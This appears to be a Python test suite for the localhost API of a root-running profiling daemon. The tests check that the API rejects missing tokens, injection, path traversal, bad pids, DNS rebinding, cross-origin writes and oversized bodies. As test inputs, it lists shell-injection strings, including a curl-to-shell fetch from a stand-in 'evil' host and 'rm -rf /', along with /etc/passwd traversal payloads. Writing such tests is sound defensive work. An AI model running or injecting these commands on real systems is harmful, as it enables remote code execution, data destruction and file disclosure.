"""The localhost API, and above all the things it refuses.

This is the only part of Performer that listens on a socket, and it runs as
root.  So the interesting tests here are not "does it work" -- they are the
four the milestone names explicitly (shell metacharacters, path traversal,
invalid pid, missing token) plus the ones a localhost API in a browser has to
survive: DNS rebinding, cross-origin writes, and a body large enough to be a
denial of service on its own.

They run against a real server on a real socket, because most of what is
being checked lives in the HTTP layer -- headers, statuses, what a handler
does before it reaches any application code -- and a test that called the
service object directly would check none of it.
"""

from __future__ import annotations

import http.client
import json
import os
import tempfile
import threading
import unittest
from pathlib import Path
from typing import Any, Dict, Optional, Tuple

from performer import daemon, layout, profiles

from .support import python_sleeper, wait_until


class Client:
    """A deliberately low-level HTTP client.

    `urllib` normalises paths, follows redirects and manages headers, all of
    which would quietly repair the malformed requests these tests exist to
    send.  `http.client` puts the request line on the wire as written.
    """

    def __init__(self, port: int, token: Optional[str]) -> None:
        self.port = port
        self.token = token

    def request(
        self,
        method: str,
        path: str,
        *,
        body: Any = None,
        token: Optional[str] = "",
        headers: Optional[Dict[str, str]] = None,
        raw_body: Optional[bytes] = None,
    ) -> Tuple[int, Any]:
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        send_headers = {"Host": f"127.0.0.1:{self.port}"}
        use_token = self.token if token == "" else token
        if use_token is not None:
            send_headers["Authorization"] = f"Bearer {use_token}"
        payload = raw_body
        if payload is None and body is not None:
            payload = json.dumps(body).encode("utf-8")
            send_headers["Content-Type"] = "application/json"
        if payload is not None:
            send_headers["Content-Length"] = str(len(payload))
        send_headers.update(headers or {})
        try:
            conn.putrequest(method, path, skip_host=True, skip_accept_encoding=True)
            for key, value in send_headers.items():
                conn.putheader(key, value)
            conn.endheaders(payload)
            response = conn.getresponse()
            raw = response.read()
            try:
                document = json.loads(raw.decode("utf-8"))
            except (UnicodeDecodeError, json.JSONDecodeError):
                document = raw
            return response.status, document
        finally:
            conn.close()


class DaemonTestCase(unittest.TestCase):
    """A running daemon on an ephemeral port, with collection stubbed out."""

    allowed_profiles = None

    def setUp(self):
        self._tmp = tempfile.TemporaryDirectory()
        self.tmp = Path(self._tmp.name)
        self.addCleanup(self._tmp.cleanup)

        self.service = daemon.Service(
            daemon.DaemonOptions(
                out_dir=self.tmp / "runs",
                token="test-token-not-a-secret",
                allowed_profiles=self.allowed_profiles,
            )
        )
        # Nothing in these tests should attach eBPF to anything: the point is
        # what happens *before* the collector is reached.  The stub records
        # what it was asked to do so the tests can assert on it.
        self.collect_calls = []
        self.service._collect_fn = self._fake_collect
        self.service.tool_issues = lambda _profile: []

        # Port 0: the OS picks a free one, so the suite never collides with a
        # developer's own daemon or with a parallel test run.
        self.server = daemon.DaemonServer(self.service, 0)
        self.port = self.server.server_address[1]
        self.thread = threading.Thread(target=self.server.serve_forever, daemon=True)
        self.thread.start()
        self.addCleanup(self._stop)
        self.client = Client(self.port, self.service.token)

    def _stop(self):
        self.server.shutdown()
        self.server.server_close()
        self.thread.join(timeout=5)

    def _fake_collect(self, **kwargs):
        self.collect_calls.append(kwargs)

        class _Result:
            manifest = {"run_id": "20260807T000000Z-stub", "status": "ok"}
            archive = kwargs["out_dir"] / "performer-20260807T000000Z-stub.tgz"

        kwargs["printer"]("stub collection finished")
        return _Result()


# --------------------------------------------------------------------------
# the four refusals the milestone names
# --------------------------------------------------------------------------


class AuthTests(DaemonTestCase):
    def test_no_token_is_rejected(self):
        status, body = self.client.request("GET", "/api/status", token=None)
        self.assertEqual(status, 401)
        self.assertIn("token", body["error"])

    def test_wrong_token_is_rejected(self):
        status, _ = self.client.request("GET", "/api/status", token="not-the-token")
        self.assertEqual(status, 401)

    def test_a_prefix_of_the_token_is_rejected(self):
        # compare_digest, not startswith or ==.
        status, _ = self.client.request(
            "GET", "/api/status", token=self.service.token[:-1]
        )
        self.assertEqual(status, 401)

    def test_every_data_endpoint_needs_the_token(self):
        for method, path in (
            ("GET", "/api/status"),
            ("GET", "/api/profiles"),
            ("GET", "/api/targets"),
            ("GET", "/api/runs"),
            ("GET", "/api/jobs"),
            ("GET", "/api/runs/20260807T000000Z-x/bundle"),
            ("POST", "/api/collect"),
        ):
            with self.subTest(path=path):
                status, _ = self.client.request(method, path, token=None, body={})
                self.assertEqual(status, 401, path)

    def test_health_is_open_but_says_nothing(self):
        # A client needs to tell "daemon up" from "port closed" before it has
        # a token; it must learn nothing else.
        status, body = self.client.request("GET", "/api/health", token=None)
        self.assertEqual(status, 200)
        self.assertEqual(set(body), {"ok", "performer"})

    def test_a_collection_cannot_be_started_without_a_token(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        status, _ = self.client.request(
            "POST", "/api/collect", token=None,
            body={"pid": target.pid, "profile": "light", "label": "x"},
        )
        self.assertEqual(status, 401)
        self.assertEqual(self.collect_calls, [])


class ShellMetacharacterTests(DaemonTestCase):
    """Nothing from a request may become a command.

    The collector never uses ``shell=True``, so these strings could not reach
    a shell even if they were accepted.  They are rejected anyway, at the
    edge, because "it happens to be safe two layers down" is not a property
    anybody can keep true through a refactor.
    """

    HOSTILE = (
        "run; rm -rf /",
        "run && curl http://evil/x | sh",
        "run`id`",
        "run$(id)",
        "run|tee /etc/passwd",
        "run\nrm -rf /",
        "run\x00truncated",
        "run'quote",
        'run"quote',
        "run>redirect",
        "run&background",
        "$IFS$9run",
    )

    def test_hostile_labels_are_rejected(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        for label in self.HOSTILE:
            with self.subTest(label=label):
                status, body = self.client.request(
                    "POST",
                    "/api/collect",
                    body={"pid": target.pid, "profile": "light", "label": label},
                )
                self.assertEqual(status, 400, f"{label!r} was not rejected")
                self.assertIn("label", body["error"])
        self.assertEqual(self.collect_calls, [])

    def test_hostile_tags_are_rejected(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        for tag in self.HOSTILE:
            with self.subTest(tag=tag):
                status, _ = self.client.request(
                    "POST",
                    "/api/collect",
                    body={
                        "pid": target.pid,
                        "profile": "light",
                        "label": "ok",
                        "tags": [tag],
                    },
                )
                self.assertEqual(status, 400, f"{tag!r} was not rejected")
        self.assertEqual(self.collect_calls, [])

    def test_a_profile_name_is_never_a_path_or_a_command(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        for profile in (
            "light; id",
            "../../../etc/passwd",
            "/etc/passwd",
            "light.yaml",
            "light\x00",
            "$(id)",
        ):
            with self.subTest(profile=profile):
                status, body = self.client.request(
                    "POST",
                    "/api/collect",
                    body={"pid": target.pid, "profile": profile, "label": "ok"},
                )
                self.assertEqual(status, 400)
                self.assertIn("unknown profile", body["error"])
        self.assertEqual(self.collect_calls, [])

    def test_notes_may_contain_anything_but_are_bounded(self):
        # Notes go into JSON, never into a name or a command, so refusing
        # punctuation there would be security theatre.  The length cap is
        # real: it bounds what a client can make the daemon hold.
        target = python_sleeper()
        self.addCleanup(target.kill)
        status, _ = self.client.request(
            "POST",
            "/api/collect",
            body={
                "pid": target.pid,
                "profile": "light",
                "label": "ok",
                "notes": "rm -rf / ; $(id) `id` -- perfectly fine in a note",
            },
        )
        self.assertEqual(status, 202)

        status, body = self.client.request(
            "POST",
            "/api/collect",
            body={
                "pid": target.pid,
                "profile": "light",
                "label": "ok2",
                "notes": "x" * 5000,
            },
        )
        self.assertEqual(status, 400)
        self.assertIn("2000", body["error"])


class PathTraversalTests(DaemonTestCase):
    TRAVERSALS = (
        "../../../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/etc/passwd",
        "20260807T000000Z-x/../../../../etc/passwd",
        "..\\..\\windows\\system32",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    )

    def test_bundle_download_refuses_to_escape_the_output_directory(self):
        for candidate in self.TRAVERSALS:
            with self.subTest(path=candidate):
                status, _ = self.client.request(
                    "GET", f"/api/runs/{candidate}/bundle"
                )
                self.assertIn(status, (400, 404), candidate)

    def test_a_valid_run_id_still_only_reaches_the_output_directory(self):
        # The guard is not the id pattern alone: the resolved path is checked
        # against out_dir, so a future loosening of the pattern cannot
        # silently become a file disclosure.
        secret = self.tmp / "secret.tgz"
        secret.write_bytes(b"not for you")
        with self.assertRaises(daemon.Rejected):
            self.service.archive_path("../secret")

    def test_an_absolute_path_is_not_a_run_id(self):
        with self.assertRaises(daemon.Rejected):
            self.service.archive_path("/etc/passwd")

    def test_a_real_bundle_in_the_output_directory_is_served(self):
        run_id = "20260807T101112Z-real"
        archive = self.service.out_dir / layout.archive_name(run_id)
        archive.write_bytes(b"\x1f\x8b" + b"0" * 64)
        self.assertEqual(self.service.archive_path(run_id), archive.resolve())

    def test_unknown_endpoints_are_a_plain_404(self):
        for path in ("/api/../etc/passwd", "/etc/passwd", "/api/nope", "/../../"):
            with self.subTest(path=path):
                status, _ = self.client.request("GET", path)
                self.assertIn(status, (400, 404), path)


class PidTests(DaemonTestCase):
    def test_a_pid_that_is_not_an_integer_is_rejected(self):
        for pid in ("1234", "1234; id", 1.5, None, [1234], True, {"pid": 1}):
            with self.subTest(pid=pid):
                status, body = self.client.request(
                    "POST",
                    "/api/collect",
                    body={"pid": pid, "profile": "light", "label": "ok"},
                )
                self.assertEqual(status, 400, repr(pid))
                self.assertIn("pid", body["error"])
        self.assertEqual(self.collect_calls, [])

    def test_out_of_range_pids_are_rejected(self):
        for pid in (0, 1, -1, -12345):
            with self.subTest(pid=pid):
                status, _ = self.client.request(
                    "POST",
                    "/api/collect",
                    body={"pid": pid, "profile": "light", "label": "ok"},
                )
                self.assertEqual(status, 400)

    def test_a_pid_that_is_not_running_is_a_404(self):
        # Not a 400: the request is well formed, the process simply is not
        # there -- which is what an operator needs to be told.
        dead = python_sleeper()
        pid = dead.pid
        dead.kill()
        dead.wait(timeout=5)
        self.assertTrue(wait_until(lambda: not _alive(pid), timeout=5))
        status, body = self.client.request(
            "POST", "/api/collect",
            body={"pid": pid, "profile": "light", "label": "ok"},
        )
        self.assertEqual(status, 404)
        self.assertIn(str(pid), body["error"])

    def test_the_daemon_refuses_to_trace_itself(self):
        # It would work, and it would measure its own probes.
        status, body = self.client.request(
            "POST", "/api/collect",
            body={"pid": os.getpid(), "profile": "light", "label": "ok"},
        )
        self.assertEqual(status, 400)
        self.assertIn("itself", body["error"])


def _alive(pid: int) -> bool:
    from performer import proc

    return proc.is_running(pid)


# --------------------------------------------------------------------------
# browser-facing defences
# --------------------------------------------------------------------------


class HostAndOriginTests(DaemonTestCase):
    def test_a_non_loopback_host_header_is_refused(self):
        # DNS rebinding: an attacker's name resolves to 127.0.0.1 and the
        # browser sends their Host header. The header is the only thing that
        # distinguishes those requests from real ones.
        for host in ("evil.example.com", "attacker.test:7878", "0.0.0.0", "10.0.0.5"):
            with self.subTest(host=host):
                status, _ = self.client.request(
                    "GET", "/api/status", headers={"Host": host}
                )
                self.assertEqual(status, 421, host)

    def test_loopback_names_are_accepted(self):
        for host in (f"127.0.0.1:{self.port}", f"localhost:{self.port}", "localhost"):
            with self.subTest(host=host):
                status, _ = self.client.request(
                    "GET", "/api/status", headers={"Host": host}
                )
                self.assertEqual(status, 200, host)

    def test_a_cross_origin_post_is_refused(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        status, body = self.client.request(
            "POST",
            "/api/collect",
            body={"pid": target.pid, "profile": "light", "label": "ok"},
            headers={"Origin": "https://evil.example.com"},
        )
        self.assertEqual(status, 403)
        self.assertIn("cross-origin", body["error"])
        self.assertEqual(self.collect_calls, [])

    def test_the_daemons_own_origin_is_accepted(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        status, _ = self.client.request(
            "POST",
            "/api/collect",
            body={"pid": target.pid, "profile": "light", "label": "ok"},
            headers={"Origin": f"http://127.0.0.1:{self.port}"},
        )
        self.assertEqual(status, 202)

    def test_no_cors_headers_are_ever_sent(self):
        # Silence is how "another origin may not read this" is said.
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request(
            "GET", "/api/status",
            headers={"Authorization": f"Bearer {self.service.token}"},
        )
        response = conn.getresponse()
        response.read()
        for header in response.getheaders():
            self.assertNotIn("access-control", header[0].lower())
        conn.close()

    def test_it_binds_loopback_only(self):
        self.assertEqual(self.server.server_address[0], "127.0.0.1")
        self.assertEqual(daemon.BIND_HOST, "127.0.0.1")


class BodyTests(DaemonTestCase):
    def test_an_oversized_body_is_refused_before_being_read(self):
        status, body = self.client.request(
            "POST",
            "/api/collect",
            headers={"Content-Length": str(daemon.MAX_BODY_BYTES + 1),
                     "Content-Type": "application/json"},
            raw_body=b"{}",
        )
        self.assertEqual(status, 413)
        self.assertIn("at most", body["error"])

    def test_a_body_that_is_not_json_is_a_clean_400(self):
        status, body = self.client.request(
            "POST", "/api/collect", raw_body=b"not json at all",
            headers={"Content-Type": "application/json"},
        )
        self.assertEqual(status, 400)
        self.assertIn("JSON", body["error"])

    def test_a_json_array_is_not_a_request(self):
        status, _ = self.client.request("POST", "/api/collect", body=[1, 2, 3])
        self.assertEqual(status, 400)

    def test_a_rejected_request_does_not_poison_a_kept_alive_connection(self):
        # HTTP/1.1 keeps connections alive, and a body refused before it was
        # read stays in the socket. If the connection were reused, those bytes
        # would be parsed as the next request line.
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.putrequest("POST", "/api/collect", skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", f"127.0.0.1:{self.port}")
        conn.putheader("Authorization", f"Bearer {self.service.token}")
        conn.putheader("Content-Type", "application/json")
        conn.putheader("Content-Length", str(daemon.MAX_BODY_BYTES + 1))
        conn.endheaders(b'{"pid": 1}')
        response = conn.getresponse()
        response.read()
        self.assertEqual(response.status, 413)
        self.assertTrue(response.will_close, "connection was left open after a refusal")
        conn.close()

        # And the daemon is still serving.
        status, _ = self.client.request("GET", "/api/status")
        self.assertEqual(status, 200)

    def test_a_negative_content_length_is_refused(self):
        status, _ = self.client.request(
            "POST", "/api/collect",
            headers={"Content-Length": "-1", "Content-Type": "application/json"},
            raw_body=b"",
        )
        self.assertEqual(status, 413)


# --------------------------------------------------------------------------
# the API doing its job
# --------------------------------------------------------------------------


class ProfileWhitelistTests(DaemonTestCase):
    allowed_profiles = ("light",)

    def test_only_whitelisted_profiles_are_offered(self):
        status, body = self.client.request("GET", "/api/profiles")
        self.assertEqual(status, 200)
        self.assertEqual([p["name"] for p in body["profiles"]], ["light"])

    def test_an_installed_but_disabled_profile_is_forbidden(self):
        # 403 rather than 400: "standard" exists and is spelled correctly,
        # this daemon has simply been told not to run it.
        self.assertIn("standard", profiles.available())
        target = python_sleeper()
        self.addCleanup(target.kill)
        status, body = self.client.request(
            "POST", "/api/collect",
            body={"pid": target.pid, "profile": "standard", "label": "ok"},
        )
        self.assertEqual(status, 403)
        self.assertIn("not enabled", body["error"])
        self.assertEqual(self.collect_calls, [])


class CollectTests(DaemonTestCase):
    def start(self, **overrides):
        target = python_sleeper()
        self.addCleanup(target.kill)
        body = {"pid": target.pid, "profile": "light", "label": "ok", "duration_s": 5}
        body.update(overrides)
        return self.client.request("POST", "/api/collect", body=body)

    def test_a_valid_request_starts_a_job(self):
        status, job = self.start()
        self.assertEqual(status, 202)
        # The worker may already have run: the response says a job exists, not
        # that it has not started.
        self.assertIn(job["state"], ("queued", "running", "done"))
        self.assertTrue(wait_until(lambda: self.collect_calls, timeout=5))
        call = self.collect_calls[0]
        self.assertEqual(call["profile_name"], "light")
        self.assertEqual(call["label"], "ok")
        self.assertEqual(call["duration_s"], 5)

    def test_missing_tools_reject_before_a_job_is_created(self):
        self.service.tool_issues = lambda _profile: ["bpftrace executable is missing"]
        status, body = self.start()
        self.assertEqual(status, 503)
        self.assertIn("bpftrace", body["error"])
        self.assertEqual(self.service.jobs(), [])
        self.assertEqual(self.collect_calls, [])

    def test_the_job_reaches_done_and_names_its_bundle(self):
        _status, job = self.start()
        self.assertTrue(
            wait_until(lambda: self.client.request("GET", f"/api/jobs/{job['id']}")[1]["state"] == "done",
                       timeout=10)
        )
        _status, finished = self.client.request("GET", f"/api/jobs/{job['id']}")
        self.assertEqual(finished["run_id"], "20260807T000000Z-stub")
        self.assertIn("stub collection finished", finished["log"])

    def test_only_one_measurement_runs_at_a_time(self):
        # Two concurrent eBPF attachments to the same box is exactly the way
        # to make the overhead estimate meaningless.
        blocked = threading.Event()
        release = threading.Event()

        def _slow(**kwargs):
            blocked.set()
            release.wait(timeout=10)
            return self._fake_collect(**kwargs)

        self.service._collect_fn = _slow
        status, _ = self.start(label="first")
        self.assertEqual(status, 202)
        self.assertTrue(blocked.wait(timeout=5))

        status, body = self.start(label="second")
        self.assertEqual(status, 409)
        self.assertIn("already running", body["error"])
        release.set()

    def test_a_duration_beyond_the_profile_limit_is_refused(self):
        # `deep` traces every context switch, so it caps at a minute -- well
        # inside the API's own bound, which is what makes this a test of the
        # profile limit rather than of MAX_DURATION_S.
        deep = profiles.load("deep")
        self.assertLess(deep.max_duration_s, daemon.MAX_DURATION_S)
        status, body = self.start(profile="deep", duration_s=deep.max_duration_s + 1)
        self.assertEqual(status, 400)
        self.assertIn("at most", body["error"])
        self.assertIn(deep.expected_overhead, body["error"])

    def test_the_api_bound_applies_even_to_a_permissive_profile(self):
        # `light` allows 900 s, which is also the API's ceiling: a request
        # beyond it holds the one job slot for longer than anyone waits.
        status, body = self.start(duration_s=daemon.MAX_DURATION_S + 1)
        self.assertEqual(status, 400)
        self.assertIn("between", body["error"])

    def test_absurd_durations_are_refused(self):
        for duration in (0, -5, 10**9, "60", None, True):
            with self.subTest(duration=duration):
                status, _ = self.start(duration_s=duration)
                self.assertEqual(status, 400, repr(duration))

    def test_a_job_can_be_cancelled(self):
        release = threading.Event()
        seen = {}

        def _slow(**kwargs):
            seen["cancel"] = kwargs["cancel"]
            release.wait(timeout=10)
            return self._fake_collect(**kwargs)

        self.service._collect_fn = _slow
        _status, job = self.start()
        self.assertTrue(wait_until(lambda: "cancel" in seen, timeout=5))
        status, _ = self.client.request("POST", f"/api/jobs/{job['id']}/cancel")
        self.assertEqual(status, 200)
        # Cancellation is delivered as the same event Ctrl-C sets, so the run
        # still stops through the path that writes the bundle.
        self.assertTrue(seen["cancel"].is_set())
        release.set()

    def test_cancelling_an_unknown_job_is_a_404(self):
        status, _ = self.client.request("POST", "/api/jobs/deadbeef/cancel")
        self.assertEqual(status, 404)


class StatusTests(DaemonTestCase):
    def test_status_reports_what_the_daemon_can_do(self):
        status, body = self.client.request("GET", "/api/status")
        self.assertEqual(status, 200)
        self.assertEqual(body["schema_version"], layout.SCHEMA_VERSION)
        self.assertFalse(body["busy"])
        self.assertEqual(body["out_dir"], str(self.service.out_dir))
        # Whether it can actually collect is a fact about privileges, and the
        # browser needs it to explain a failure before it happens.
        self.assertIsInstance(body["can_collect"], bool)
        self.assertIsInstance(body["tool_issues"], list)

    def test_targets_are_read_from_proc_and_never_executed(self):
        target = python_sleeper()
        self.addCleanup(target.kill)
        self.assertTrue(wait_until(lambda: _alive(target.pid), timeout=5))
        status, body = self.client.request("GET", "/api/targets")
        self.assertEqual(status, 200)
        pids = {entry["pid"] for entry in body["targets"]}
        self.assertNotIn(os.getpid(), pids)
        for entry in body["targets"]:
            self.assertGreaterEqual(entry["threads"], 2)

    def test_runs_lists_bundles_in_the_output_directory(self):
        from performer import fake

        fake.generate(self.service.out_dir, label="listed", seed=1)
        status, body = self.client.request("GET", "/api/runs")
        self.assertEqual(status, 200)
        self.assertEqual([run["label"] for run in body["runs"]], ["listed"])

    def test_a_bundle_can_be_downloaded_whole(self):
        from performer import fake

        _run_dir, archive = fake.generate(self.service.out_dir, label="dl", seed=2)
        _status, body = self.client.request("GET", "/api/runs")
        run_id = body["runs"][0]["run_id"]
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request(
            "GET", f"/api/runs/{run_id}/bundle",
            headers={"Authorization": f"Bearer {self.service.token}"},
        )
        response = conn.getresponse()
        payload = response.read()
        conn.close()
        self.assertEqual(response.status, 200)
        self.assertEqual(payload, Path(archive).read_bytes())
        self.assertEqual(response.getheader("Content-Type"), "application/gzip")


class ViewerTests(DaemonTestCase):
    def test_the_viewer_is_served_without_a_token(self):
        # It is a static asset containing no run data; every byte of that
        # comes from the API, which does require the token.
        if layout.viewer_index() is None:
            self.skipTest("viewer not built")
        status, body = self.client.request("GET", "/", token=None)
        self.assertEqual(status, 200)
        self.assertIn(b"<title>Performer</title>", bytes(body)[:2000])

    def test_the_viewer_is_served_under_a_policy_that_forbids_the_network(self):
        if layout.viewer_index() is None:
            self.skipTest("viewer not built")
        conn = http.client.HTTPConnection("127.0.0.1", self.port, timeout=10)
        conn.request("GET", "/")
        response = conn.getresponse()
        response.read()
        policy = response.getheader("Content-Security-Policy") or ""
        conn.close()
        self.assertIn("default-src 'none'", policy)
        self.assertIn("connect-src 'self'", policy)
        self.assertEqual(response.getheader("X-Content-Type-Options"), "nosniff")


class TokenTests(unittest.TestCase):
    def test_a_generated_token_is_long_and_random(self):
        with tempfile.TemporaryDirectory() as tmp:
            first = daemon.Service(daemon.DaemonOptions(out_dir=Path(tmp) / "a"))
            second = daemon.Service(daemon.DaemonOptions(out_dir=Path(tmp) / "b"))
            self.assertGreaterEqual(len(first.token), 32)
            self.assertNotEqual(first.token, second.token)

    def test_check_token_rejects_none_and_empty(self):
        with tempfile.TemporaryDirectory() as tmp:
            service = daemon.Service(daemon.DaemonOptions(out_dir=Path(tmp)))
            for presented in (None, "", " "):
                with self.assertRaises(daemon.Rejected):
                    service.check_token(presented)


if __name__ == "__main__":  # pragma: no cover
    unittest.main()
